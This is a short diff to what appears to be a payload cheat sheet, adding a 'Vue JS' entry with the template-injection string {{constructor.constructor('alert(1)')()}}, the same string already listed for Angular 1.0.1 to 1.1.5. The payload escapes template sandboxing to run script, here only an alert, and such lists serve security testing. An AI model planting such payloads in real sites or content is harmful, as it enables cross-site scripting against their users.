@@ -132,3 +132,9 @@ Angular 1.0.1 - 1.1.5
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
+
+Vue JS
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
+```
